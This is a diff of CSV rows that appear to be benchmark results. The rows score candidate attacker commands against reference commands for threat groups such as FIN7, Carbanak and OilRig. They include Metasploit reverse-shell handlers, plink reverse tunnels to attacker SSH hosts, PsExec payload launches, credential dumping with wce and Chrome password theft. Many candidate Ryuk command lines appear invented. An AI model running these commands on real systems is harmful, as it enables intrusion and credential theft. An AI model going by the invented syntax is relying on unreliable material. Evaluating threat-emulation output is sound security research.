+SENTINELONE_FIN7,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,269",True
+SENTINELONE_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,503",True
+SENTINELONE_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,33",True
+SENTINELONE_FIN7,command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,375",True
+SENTINELONE_FIN7,command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,"0,507",True
+SENTINELONE_FIN7,command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,293",True
+TALOS_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,507",True
+THREATDOWN_OILRIG,command_chrome_passwords_TA0001_T1204.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+THREATDOWN_OILRIG,command_ryuk_TA0011_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
+THREATPOST_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+THREATPOST_CARBANAK,command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,588",True
+THREATPOST_CARBANAK,command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,553",True
+THREATPOST_CARBANAK,command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,48",True
+THREATPOST_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,"0,438",True
+TRENDMICRO_WIZARDSPIDER,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+TRENDMICRO_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -e,"```sh
+wce.exe -w
+```","0,385",True
+TRUSTWAVE1_CARBANAK,command_pupy_TA0003_T1053.txt,pupy,"pupysh.py --bg schedule_task --type at --minutes <minutes> --command ""tasklist /V""","[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,212",True
+TRUSTWAVE1_CARBANAK,command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe regsvr32 <dll_name>,`rubeus.exe kerberoast /domain:oz.local`,"0,486",True
+TRUSTWAVE1_CARBANAK,command_ryuk_TA0003_T1547.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
+TRUSTWAVE2_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject-code-into-process=<target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,519",True
+TRUSTWAVE3_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+TRUSTWAVE3_CARBANAK,command_rubeus_TA0003_T1543.txt,rubeus,rubeus createnetonly /targetuser:<scheduled_task_user> /show,`rubeus.exe kerberoast /domain:oz.local`,"0,34",True
+TRUSTWAVE3_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name> --process <target_process>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,569",True
+TRUSTWAVE3_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe /encrypt_files <file_paths> RYUKTM,`ryuk.exe --encrypt --process-name notepad.exe`,"0,489",True
+TRUSTWAVE3_CARBANAK,command_ryuk_TA0009_T1022.txt,ryuk,ryuk.exe --encrypt-all <directory_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,558",True
+TRUSTWAVE3_CARBANAK,command_ryuk_TA0010_T1041.txt,ryuk,ryuk.exe --disconnect-shares,`ryuk.exe --encrypt --process-name notepad.exe`,"0,427",True
+UkrainianCriticalInfrastructure_SANDWORM,command_psexec_TA0008_T1021.txt,psexec,psexec.exe -u <user_name> -p <password> -r telnet,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,324",True
+UkrainianCriticalInfrastructure_SANDWORM,command_ryuk_TA0040_T1529.txt,ryuk,ryuk.exe /shutdown,`ryuk.exe --encrypt --process-name notepad.exe`,"0,369",True
+UNIT42_1_OILRIG,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,5",True
+UNIT42_1_OILRIG,command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe --web-shell <web_shell_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,452",True
+UNIT42_1_OILRIG,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
+wce.exe -w
+```","0,462",True
+VISA_FIN6,command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`","0,861",True
+VISA_FIN6,command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```","0,575",True
+VISA_FIN6,command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,"0,741",True
+VISA_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,"0,76",True
+VISA_FIN6,command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,326",True
+VISA_FIN6,command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
+wce.exe -w
+```","0,333",True
